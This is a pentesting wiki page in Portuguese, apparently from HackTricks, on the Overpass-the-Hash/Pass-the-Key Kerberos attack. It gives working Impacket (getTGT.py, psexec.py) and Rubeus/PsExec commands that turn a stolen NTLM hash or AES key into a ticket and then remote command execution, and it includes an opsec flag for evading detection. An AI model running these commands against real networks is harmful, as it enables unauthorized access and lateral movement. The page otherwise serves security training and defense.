# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

O **Overpass The Hash/Pass The Key (PTK)** é um ataque projetado para ambientes onde o protocolo NTLM tradicional é restrito, e a autenticação Kerberos tem prioridade. Este ataque aproveita o hash NTLM ou as chaves AES de um usuário para solicitar tickets Kerberos, permitindo acesso não autorizado a recursos dentro de uma rede.

Para executar este ataque, o primeiro passo envolve adquirir o hash NTLM ou a senha da conta do usuário alvo. Após garantir essa informação, um Ticket Granting Ticket (TGT) para a conta pode ser obtido, permitindo que o atacante acesse serviços ou máquinas para os quais o usuário tem permissões.

O processo pode ser iniciado com os seguintes comandos:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Para cenários que necessitam de AES256, a opção `-aesKey [AES key]` pode ser utilizada. Além disso, o ticket adquirido pode ser empregado com várias ferramentas, incluindo smbexec.py ou wmiexec.py, ampliando o escopo do ataque.

Problemas encontrados, como _PyAsn1Error_ ou _KDC cannot find the name_, são tipicamente resolvidos atualizando a biblioteca Impacket ou usando o nome do host em vez do endereço IP, garantindo compatibilidade com o KDC do Kerberos.

Uma sequência de comando alternativa usando Rubeus.exe demonstra outro aspecto desta técnica:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este método espelha a abordagem **Pass the Key**, com foco em comandar e utilizar o ticket diretamente para fins de autenticação. É crucial notar que a iniciação de um pedido de TGT aciona o evento `4768: Um ticket de autenticação Kerberos (TGT) foi solicitado`, significando um uso de RC4-HMAC por padrão, embora sistemas Windows modernos prefiram AES256.

Para se conformar com a segurança operacional e usar AES256, o seguinte comando pode ser aplicado:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referências

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
